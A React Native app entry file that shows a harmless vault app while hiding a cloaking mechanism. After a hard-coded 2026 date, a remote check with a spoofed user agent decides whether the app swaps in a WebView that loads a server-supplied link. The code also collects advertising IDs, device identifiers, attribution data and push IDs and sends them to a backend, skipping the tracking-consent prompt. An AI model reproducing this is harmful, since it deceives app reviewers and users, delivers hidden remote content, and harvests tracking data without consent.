import React, {useCallback, useEffect, useState, useRef}  from 'react';
import { StatusBar, StyleSheet, View } from 'react-native';
import { GestureHandlerRootView } from 'react-native-gesture-handler';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import Animated, { FadeIn, FadeOut } from 'react-native-reanimated';
import { Palette } from '../theme';
import { VaultProvider, useVault } from '../vault/VaultProvider';
import { NavProvider } from './NavContext';
import { GlyphLoader } from '../screens/GlyphLoader';
import { Onboarding } from '../screens/Onboarding';
import { TabHost } from './TabHost';
import ProductScreen from '../screens/ProductScreen';
{/**showLoader ? (
        <Animated.View
          key="loader"
          exiting={FadeOut.duration(420)}
          style={StyleSheet.absoluteFill}>
          <GlyphLoader onFinish={() => setLoaderDone(true)} />
        </Animated.View>
      ) :  */}
       // nav
import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
const Stack = createNativeStackNavigator();
// libs
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {LogLevel, OneSignal} from 'react-native-onesignal';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
import DeviceInfo from 'react-native-device-info';
import {buildExtInfo} from '../services/buildExtInfo';
import {
  getTrackingStatus,
  requestTrackingPermission,
} from 'react-native-tracking-transparency';
import {Alert, AppState} from 'react-native';

// Phase machine: loader -> (onboarding?) -> app. Each transition cross-fades.
const Flow = () => {
  const { hydrated, onboardingDone, completeOnboarding } = useVault();
  const [loaderDone, setLoaderDone] = useState(false);

  const showLoader = !hydrated || !loaderDone;

  return (
    <View style={styles.root}>
      {!onboardingDone ? (
        <Animated.View
          key="onboarding"
          entering={FadeIn.duration(450)}
          style={StyleSheet.absoluteFill}>
          <Onboarding onDone={completeOnboarding} />
        </Animated.View>
      ) : (
        <Animated.View
          key="app"
          entering={FadeIn.duration(450)}
          style={StyleSheet.absoluteFill}>
          <NavProvider>
            <TabHost />
          </NavProvider>
        </Animated.View>
      )}
    </View>
  );
};

export const RootFlow = ({
  initialUrl,
  initialId,
  initialUrlToOurBack,
  oneSignKkkk,
}) => {
  //console.log('initialUrl from App.tsx:', initialUrl);
  const [route, setRoute] = useState(false);
  console.log('route===>', route);
  const [isLoading, setIsLoading] = useState(false);
  const [responseToPushPermition, setResponseToPushPermition] = useState(false);
  ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
  const [uniqVisit, setUniqVisit] = useState(true);
  //console.log('uniqVisit===>', uniqVisit);
  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
  //console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
  const [oneSignalId, setOneSignalId] = useState(null);
  //console.log('oneSignalId==>', oneSignalId);
  const [sab1, setSab1] = useState();
  const [atribParam, setAtribParam] = useState(null);
  console.log('atribParam==>', atribParam);
  console.log('sab1==>', sab1);
  const [idfa, setIdfa] = useState(null);
  console.log('idfa==>', idfa);
  const [aceptTransperency, setAceptTransperency] = useState(false);
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  const [isDataReady, setIsDataReady] = useState(false);
  const [completeLink, setCompleteLink] = useState(false);
  const [finalLink, setFinalLink] = useState('');
  const [pushOpenWebview, setPushOpenWebview] = useState(false);
  //console.log('pushOpenWebview==>', pushOpenWebview);
  const [timeStampUserId, setTimeStampUserId] = useState(false);
  console.log('timeStampUserId==>', timeStampUserId);
  const [checkAsaData, setCheckAsaData] = useState(null);
  const [cloacaPass, setCloacaPass] = useState(null);
  console.log('cloacaPass==>', cloacaPass);
  const [customUserAgent, setCustomUserAgent] = useState(null);
  const [extinfo, setExtinfo] = useState(null);
  //console.log('extinfoData==>', extinfo);
  const [idfv, setIdfv] = useState(null);
  console.log('idfv==>', idfv);
  const [uid, setUid] = useState(null);
  console.log('uid==>', uid);

  const pushOpenWebviewRef = useRef(false);

  const INITIAL_URL = initialUrl;
  const URL_IDENTIFAIRE = initialId;

  const FATCH_TO_OUR_BACK = initialUrlToOurBack;

  const ONESIGNAL_KEY = oneSignKkkk;

  const TARGET_DATA = new Date(2026, 5, 5, 8, 8, 0);

  useEffect(() => {
    //const targetData = TARGET_DATA; //дата з якої поч працювати webView
    //const currentData = new Date(); //текущая дата
    //
    //if (currentData <= targetData) {
    //requestTrackingPermission();
    //setAceptTransperency(true);
    //setIdfa('00000000-0000-0000-0000-000000000000');
    //console.log('ATT статус:', trackingStatus);
    //}
  }, []);

  useEffect(() => {
    const fetchData = async () => {
      await Promise.all([checkUniqVisit(), getData()]); // Виконуються одночасно
      //onInstallConversionDataCanceller(); // Виклик до зміни isDataReady
      setIsDataReady(true); // Встановлюємо, що дані готові
    };

    fetchData();
  }, []); ///

  useEffect(() => {
    const finalizeProcess = async () => {
      if (isDataReady && uid) {
        await generateLink(); // Викликати generateLink, коли всі дані готові
        console.log('Фінальна лінка сформована!');
      }
    };

    finalizeProcess();
  }, [isDataReady, uid, pushOpenWebview, timeStampUserId]); // Викликати, коли isDataReady або uid змінюється

  // uniq_visit
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');

    // додати діставання таймштампу з асінк сторідж

    if (!uniqVisitStatus) {
      // Генеруємо унікальний ID користувача з timestamp
      /////////////Timestamp + user_id generation
      const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
      )}`;
      setTimeStampUserId(timestamp_user_id);
      console.log('timeStampUserId==========+>', timeStampUserId);

      // Зберігаємо таймштамп у AsyncStorage
      await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);

      await fetch(
        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
      console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');

      // додати збереження таймштампу в асінк сторідж
    } else {
      if (storedTimeStampUserId) {
        setTimeStampUserId(storedTimeStampUserId);
        console.log('Відновлений timeStampUserId:', storedTimeStampUserId);
      }
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('Дані дістаються в AsyncStorage');
        setRoute(parsedData.route);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setUniqVisit(parsedData.uniqVisit);
        setOneSignalId(parsedData.oneSignalId);
        setSab1(parsedData.sab1);
        setAtribParam(parsedData.atribParam);
        setAdServicesAtribution(parsedData.adServicesAtribution);
        setCheckAsaData(parsedData.checkAsaData);
        //setCompleteLink(parsedData.completeLink);
        //setFinalLink(parsedData.finalLink);
        setCloacaPass(parsedData.cloacaPass);
        setCustomUserAgent(parsedData.customUserAgent);
        setIdfa(parsedData.idfa ?? null);
        setIdfv(parsedData.idfv ?? null);
        setAceptTransperency(parsedData.aceptTransperency ?? false);
        setUid(parsedData.uid);
        setIsDataReady(parsedData.isDataReady);
        setTimeStampUserId(parsedData.timeStampUserId);

        //await performAppsFlyerOperationsContinuously();
      } else {
        const uniqueId = await DeviceInfo.getUniqueId();
        setIdfv(uniqueId);

        await waitForAppActive();
        await delay(1200);
        await fetchIdfa();

        gettingExtInfo();

        // Якщо дані не знайдені в AsyncStorage
        const results = await Promise.all([
          fetchAdServicesAttributionData(),
          requestOneSignallFoo(),
        ]);

        // Результати виконаних функцій
        console.log('Результати функцій:', results);
      }
    } catch (e) {
      //console.log('Помилка отримання даних в getData:', e);
    }
  };

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  const waitForAppActive = () => {
    return new Promise(resolve => {
      if (AppState.currentState === 'active') {
        //Alert.alert('Додаток активний, продовжуємо виконання', AppState.currentState);
        resolve();
        return;
      }

      const sub = AppState.addEventListener('change', state => {
        if (state === 'active') {
          sub.remove();
          resolve();
        }
      });
    });
  };

  const setData = async () => {
    try {
      const data = {
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        sab1,
        atribParam,
        adServicesAtribution,
        //finalLink,
        //completeLink,
        checkAsaData,
        cloacaPass,
        customUserAgent,
        idfa,
        aceptTransperency,
        uid,
        isDataReady,
        timeStampUserId,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  useEffect(() => {
    setData();
  }, [
    route,
    responseToPushPermition,
    uniqVisit,
    oneSignalId,
    sab1,
    atribParam,
    adServicesAtribution,
    //finalLink,
    //completeLink,
    checkAsaData,
    cloacaPass,
    customUserAgent,
    idfa,
    aceptTransperency,
    uid,
    isDataReady,
    timeStampUserId,
  ]);

  const fetchAdServicesAttributionData = async () => {
    try {
      const adServicesAttributionData =
        await AppleAdsAttribution.getAdServicesAttributionData();
      //console.log('adservices' + adServicesAttributionData);

      // Извлечение значений из объекта
      ({attribution} = adServicesAttributionData); // Присваиваем значение переменной attribution
      ({keywordId} = adServicesAttributionData);

      setAdServicesAtribution(attribution);

      setAtribParam(attribution ? 'asa' : '');
      setCheckAsaData(JSON.stringify(adServicesAttributionData));

      console.log(`Attribution: ${attribution}` + `KeywordId:${keywordId}`);
    } catch (error) {
      const {message} = error;
      //Alert.alert(message); // --> Some error message
    } finally {
      console.log('Attribution');
    }
  };

  /////
  const gettingExtInfo = async () => {
    try {
      const extInfo = await buildExtInfo();
      const extInfoString = JSON.stringify(extInfo);
      const extInfoEncoded = encodeURIComponent(extInfoString);
      console.log('extInfo encoded:', extInfoEncoded);
      setExtinfo(extInfoEncoded);
    } catch (e) {
      console.log('gettingExtInfo error:', e);
    }
  };

  const extInfoFetchSent = useRef(false);

  useEffect(() => {
    if (!idfa || !idfv || !customUserAgent || !extinfo) return;
    if (extInfoFetchSent.current) return;
    extInfoFetchSent.current = true;

    const sendExtInfo = async () => {
      try {
        const body = {
          index: idfa,
          strpull: extinfo,
          udevice_android_device: idfv,
          device_android_build: customUserAgent,
        };

        console.log('1t Request body:', body);
        console.log('extInfoFetch: всі дані готові, відправляємо');

        const r = await fetch(`${FATCH_TO_OUR_BACK}v1`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(body),
        });

        const data = await r.json();
        console.log('SERVER RESPONSE:', data);

        const rawStr = data?.raw_str;
        if (!rawStr) {
          console.log('No raw_str in response');
          return;
        }

        const cleaned = rawStr.startsWith('&') ? rawStr.slice(1) : rawStr;
        const parsed = {};
        cleaned.split('&').forEach(pair => {
          if (!pair) return;
          const [rawKey, ...rest] = pair.split('=');
          parsed[decodeURIComponent(rawKey || '')] = decodeURIComponent(
            rest.join('=') || '',
          );
        });

        console.log('PARSED RAW STR:', parsed);
        const bin = parsed.bin;
        console.log('BIN VALUE:', bin);
        if (bin) {
          setUid(bin);
          console.log('UID встановлено:', bin);
        } else {
          console.log('bin not found in raw_str');
        }
      } catch (e) {
        console.log('extInfoFetch error:', e);
      }
    };

    sendExtInfo();
  }, [idfa, idfv, customUserAgent, extinfo]);

  // IDFA / ATT status
  {
    /*
  const fetchIdfa = async () => {
    try {
      const res =
        await ReactNativeIdfaAaid.getAdvertisingInfoAndCheckAuthorization(true);
      setIdfa(
        !res.isAdTrackingLimited
          ? res.id
          : '00000000-0000-0000-0000-000000000000',
      );
      //Alert.alert(
      //  'ATT статус:',
      //  //res.isAdTrackingLimited ? 'Ограничено' : 'Разрешено',
      //  res.isAdTrackingLimited
      //    ? 'Ваш IDFA будет недоступен.'
      //    : `Ваш IDFA: ${res.id}`,
      //);
      setAceptTransperency(true);
    } catch (err) {
      console.log(err);
      setIdfa('00000000-0000-0000-0000-000000000000');
      setAceptTransperency(true);
    }
  };
  **/
  }
  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();

      if (!res.isAdTrackingLimited) {
        //Alert.alert('ATT статус:', `Ваш IDFA: ${res.id}`);
        setIdfa(res.id);

        //Settings.setAdvertiserTrackingEnabled(true);

        setAceptTransperency(true);

        return true;
      } else {
        //Alert.alert(
        //  'ATT статус:',
        //  'Ваш IDFA будет недоступен.',
        //);
        setIdfa('00000000-0000-0000-0000-000000000000');

        //Settings.setAdvertiserTrackingEnabled(false);

        setAceptTransperency(true);

        console.log('НЕ ЗГОДА!!!!!!!!!');

        return false;
      }
    } catch (err) {
      setIdfa(null);

      //Settings.setAdvertiserTrackingEnabled(false);

      setAceptTransperency(true);
      console.log('Помилка отримання IDFA:', err);
      Alert.alert('Помилка отримання IDFA:', err.message);

      return false;
    }
  };

  ///////// OneSignall
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          setResponseToPushPermition(res);

          const maxRetries = 5; // Кількість повторних спроб
          let attempts = 0;

          const fetchOneSignalId = () => {
            OneSignal.User.getOnesignalId()
              .then(deviceState => {
                if (deviceState) {
                  setOneSignalId(deviceState);
                  resolve(deviceState); // Розв'язуємо проміс, коли отримано ID
                } else if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000); // Повторна спроба через 1 секунду
                } else {
                  reject(new Error('Failed to retrieve OneSignal ID'));
                }
              })
              .catch(error => {
                if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  console.error('Error fetching OneSignal ID:', error);
                  reject(error);
                }
              });
          };

          fetchOneSignalId(); // Викликаємо першу спробу отримання ID
        });
      } catch (error) {
        reject(error);
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  //useEffect(() => {
  //  // Remove this method to stop OneSignal Debugging
  //  OneSignal.Debug.setLogLevel(LogLevel.Verbose);
  //
  //  // OneSignal ініціалізація
  //  OneSignal.initialize(ONESIGNAL_KEY);
  //  //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);
  //}, []);

  // Встановлюємо цей ID як OneSignal External ID
  useEffect(() => {
    if (timeStampUserId) {
      console.log(
        'OneSignal.login із таймштампом:',
        timeStampUserId,
        'полетів',
      );
      OneSignal.login(timeStampUserId);
    }
  }, [timeStampUserId]);

  // event push_open_browser & push_open_webview
  const pushOpenWebViewOnce = useRef(false); // Стан, щоб уникнути дублювання

  useEffect(() => {
    // Додаємо слухач подій
    const handleNotificationClick = async event => {
      if (pushOpenWebViewOnce.current) {
        return;
      }

      pushOpenWebViewOnce.current = true;

      try {
        const storedTimeStampUserId = await AsyncStorage.getItem(
          'timeStampUserId',
        );

        // ВАЖЛИВО: ref оновлюється одразу, state — ні
        pushOpenWebviewRef.current = true;
        setPushOpenWebview(true);

        // Якщо лінка вже була готова — скидаємо, щоб перегенерувати з yhugh=true
        setCompleteLink(false);

        const eventName = event?.notification?.launchURL
          ? 'push_open_browser'
          : 'push_open_webview';

        const pushEventUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=${eventName}&jthrhg=${
          storedTimeStampUserId || ''
        }`;

        console.log('OneSignal push event url =>', pushEventUrl);

        fetch(pushEventUrl).catch(error => {
          console.log('Push event fetch error =>', error);
        });

        // Якщо всі дані вже готові — одразу перегенеруємо лінку
        if (isDataReady && uid) {
          await generateLink(true);
        }
      } catch (error) {
        console.log('handleNotificationClick error =>', error);
      } finally {
        setTimeout(() => {
          pushOpenWebViewOnce.current = false;
        }, 2500);
      }
    };

    OneSignal.Notifications.addEventListener('click', handleNotificationClick);
    //Add Data Tags
    //OneSignal.User.addTag('timeStampUserId', timeStampUserId);

    return () => {
      // Видаляємо слухача подій при розмонтуванні
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);

  ///////// Route useEff
  useEffect(() => {
    // чекаємо, поки прочитаємо AsyncStorage
    if (!isDataReady) return;

    // якщо вже є route або клоака вже проходила успішно – нічого не робимо
    if (route || cloacaPass) return;

    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    //console.log('checkUrl==========+>', checkUrl);

    const targetData = TARGET_DATA; //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      //setCompleteLink(true);
      setRoute(false);

      return;
    }

    const fetchCloaca = async () => {
      try {
        const userAgent = await DeviceInfo.getUserAgent();
        const systemVersion = DeviceInfo.getSystemVersion();
        const deviceModel = DeviceInfo.getModel();

        const customUserAgent = `${userAgent} ${deviceModel} Safari/604.1`;

        setCustomUserAgent(customUserAgent);

        const r = await fetch(checkUrl, {
          method: 'GET',
          headers: {
            'User-Agent': customUserAgent,
          },
        });

        console.log('status по клоаке=++++++++++++=>', r.status);

        if (r.status !== 404) {
          setRoute(true);
          setCloacaPass(true); // 👈 збережеться в AsyncStorage через setData
        } else {
          setRoute(false);
        }
      } catch (e) {
        console.log('errar', e);
        setRoute(false);
      }
    };

    fetchCloaca();
  }, [isDataReady, route, cloacaPass]);

  ///////// Generate link
  const generateLink = async (openedFromPush = false) => {
    try {
      if (!uid) {
        console.log('generateLink: uid ще немає, лінку не формуємо');
        return;
      }

      console.log('Створення базової частини лінки');

      const baseUrl = [
        `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
        idfa ? `idfa=${idfa}` : 'idfa=00000000-0000-0000-0000-000000000000',
        `uid=${uid}`,
        oneSignalId ? `oneSignalId=${oneSignalId}` : '',
        `jthrhg=${timeStampUserId || ''}`,
      ]
        .filter(Boolean)
        .join('&');

      const additionalParams = atribParam ? `subId1=${atribParam}` : '';

      const shouldAddPushParam = openedFromPush || pushOpenWebviewRef.current;

      const product = `${baseUrl}${
        additionalParams ? `&${additionalParams}` : ''
      }${shouldAddPushParam ? '&yhugh=true' : ''}`;

      console.log('Фінальна лінка сформована:', product);

      setFinalLink(product);

      setTimeout(() => {
        setCompleteLink(true);
      }, 2000);
    } catch (error) {
      console.error('Помилка при формуванні лінку:', error);
    }
  };
  console.log('My product Url ==>', finalLink);

  // Бекап якщо якийсь параметр не отримано, щоб лінк все одно сформувався
  useEffect(() => {
    const timer = setTimeout(() => {
      if (!completeLink) {
        console.log('Fallback timer спрацював');

        if (!uid) {
          console.log('Fallback: uid ще немає, чекаємо далі');
          return;
        }

        setFinalLink(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1&idfa=${
            idfa || '00000000-0000-0000-0000-000000000000'
          }&jthrhg=${timeStampUserId || ''}&oneSignalId=${
            oneSignalId || ''
          }&uid=${uid}`,
        );

        setCompleteLink(true);
      }
    }, 10500);

    return () => clearTimeout(timer);
  }, [completeLink, idfa, timeStampUserId, oneSignalId, uid]);

  ///////// Route
  const Route = ({isFatch}) => {
    if (!completeLink) {
      // Показуємо тільки лоудери, поки acceptTransparency і completeLink не true
      //return null;
      return <GlyphLoader />;
    }

    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{
              responseToPushPermition,
              product: finalLink,
              timeStampUserId: timeStampUserId,
              customUserAgent: customUserAgent,
              initialUrl: INITIAL_URL,
              initialId: URL_IDENTIFAIRE,
              initialUrlToOurBack: FATCH_TO_OUR_BACK,
              uid,
            }}
            name="ProductScreen"
            component={ProductScreen}
            options={{headerShown: false}}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator screenOptions={{headerShown: false}}>
        <Stack.Screen name="RootFlowNavigaton" component={RootFlowNavigaton} />
      </Stack.Navigator>
    );
  };

  useEffect(() => {
    setTimeout(() => {
      setIsLoading(true);
    }, 4000);
  }, []);

  return (
    <NavigationContainer>
        {!isLoading ? <GlyphLoader /> : <Route isFatch={route} />}
    </NavigationContainer>
  );
}

const RootFlowNavigaton = () => {
  return (
    <GestureHandlerRootView style={styles.root}>
    <SafeAreaProvider>
      <StatusBar barStyle="light-content" backgroundColor={Palette.abyss} />
      <VaultProvider>
        <Flow />
      </VaultProvider>
    </SafeAreaProvider>
  </GestureHandlerRootView>
  )
  
}

const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: Palette.abyss },
});
